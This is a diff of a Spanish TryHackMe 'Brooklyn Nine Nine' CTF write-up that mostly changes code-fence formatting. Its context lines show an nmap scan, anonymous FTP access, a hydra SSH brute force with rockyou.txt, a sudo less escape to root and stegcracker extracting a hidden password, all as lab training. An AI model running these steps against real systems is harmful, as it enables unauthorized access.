@@ -61,7 +61,7 @@ Significado de las flags:
 * `-A`&nbsp;: escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)
 * `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ nmap -A 10.10.190.53 -oN nmap_output
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 19:13 CEST
@@ -107,7 +107,7 @@ Tenemos tres puertos abiertos:
 
 El volcado de **nmap** nos cuenta que el servidor FTP soporta login anónimo. Vamos a por ello.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ ftp 10.10.190.53
 Connected to 10.10.190.53.
@@ -138,7 +138,7 @@ Abrimos el fichero que acabamos de descargarnos y nos encontramos una nota de *A
 
 Vamos a probar con **hydra** contra el servicio ssh utilizando el usuario *jake* y *rockyou.txt* como diccionario a ver si conseguimos algo. Para empezar, localizamos el diccionario en nuestro equipo.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ locate rockyou.txt
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
@@ -147,7 +147,7 @@ Vamos a probar con **hydra** contra el servicio ssh utilizando el usuario *jake*
 
 Y lanzamos **hydra**:
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.190.53:22  
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -169,7 +169,7 @@ Significado de las flags:
 
 Con la contraseña de *jake* nos logamos via ssh.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ ssh jake@10.10.190.53
 jake@10.10.190.53's password: 
@@ -218,7 +218,7 @@ Tenemos la primer flag. Vamos a por root.
 
 Lo primero es chequear los binarios que *jake* puede ejecutar con privilegios de root.
 
-```console
+```
 [...]
 jake@brookly_nine_nine:/home/holt$ sudo -l
 Matching Defaults entries for jake on brookly_nine_nine:
@@ -237,7 +237,7 @@ Nos vamos a [GTFOBins](https://gtfobins.github.io/), buscamos por *less* y le da
 
 OK. Toca probar.
 
-```console
+```
 [...]
 jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
 
@@ -324,7 +324,7 @@ Descargamos la imagen a nuestra carpeta de trabajo y le damos cariño con **steg
 
 > **Tip:** si intentamos descargar la imagen dando al boton derecho del ratón no veremos la opción *Save Image As...* pues la imagen se ha cargado via CSS. Toca abrirla en otra pestaña para poder hacerlo mediante ese método. Otra opción: `wget http://10.10.190.53/brooklyn99.jpg`
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ steghide --info brooklyn99.jpg
 "brooklyn99.jpg":
@@ -337,7 +337,7 @@ steghide: can not uncompress data. compressed data is corrupted.
 
 Malo. Nos pide una passphrase para extraer la información. Tiramos de **stegcracker**.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ stegcracker brooklyn99.jpg
 StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
@@ -360,7 +360,7 @@ admin
 
 **stegcracker** ha hecho dos cosas: averiguar la passphrase y extraernos el fichero oculto en la imagen con el nombre *brooklyn99.jpg.out* en nuestro directorio de trabajo.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ cat brooklyn99.jpg.out
 Holts Password:
@@ -373,7 +373,7 @@ OK. Tenemos la contraseña del usuario *Holt*.
 
 Otra posibilidad habría sido extraerlo con **steghide** utilizando la passphrase que nos aportó **stegcracker**.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ steghide extract -sf brooklyn99.jpg
 Enter passphrase: 
@@ -389,7 +389,7 @@ Enjoy!!
 
 Vamos por ssh con el usuario *holt*.
 
-```console
+```
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
 └─$ ssh holt@10.10.190.53              
 holt@10.10.190.53's password: 
@@ -443,7 +443,7 @@ Vamos a ello:
 
 * tecleamos `clear`&nbsp; + Enter. Se nos limpia el terminal y nos queda solo la almohadilla.
 
-```console
+```
 # 
 # whoami
 root
@@ -475,4 +475,4 @@ Esto va en gustos.
 
 Pues hasta aquí la guía para resolver el room. Espero que os haya resultado útil.
 
-Saludos ;)
+Saludos.
